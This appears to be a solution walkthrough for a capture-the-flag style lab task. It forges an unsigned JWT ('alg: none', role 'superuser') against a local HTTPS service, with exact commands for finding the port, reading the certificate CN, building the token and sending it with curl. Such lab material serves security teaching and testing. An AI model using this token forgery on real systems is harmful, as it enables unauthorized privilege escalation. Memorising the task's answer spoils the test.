First find the hidden HTTPS listener with `ss -tulpn` or `netstat -tulpn` to identify the local port it's bound to. Then retrieve the TLS certificate's Common Name with `openssl s_client -connect 127.0.0.1:<port> < /dev/null 2>/dev/null | openssl x509 -noout -subject`, and use that recovered CN value (not a guess) as the `aud` claim. Read `/home/user/backend_logic.sh` carefully to confirm it accepts `alg: none` tokens without checking a signature — this is the exploitable flaw. Build the forged token in `/home/user/forge_token.sh` by constructing a JSON header `{"alg":"none","typ":"JWT"}` and a JSON payload containing the recovered `aud` and `"role":"superuser"`, base64-encoding each with `base64`, then converting to base64url via `tr '+/' '-_' | tr -d '='`. Join as `header.payload.` — note the trailing dot with an empty signature is required. Send it with `curl -k -H "Authorization: Bearer $(bash /home/user/forge_token.sh)" https://127.0.0.1:<port>/secure/flag`, using `-k` to bypass the self-signed cert warning. Save the exact response body to `/home/user/audit_result.txt` — don't add extra whitespace or newlines beyond what the server returns.
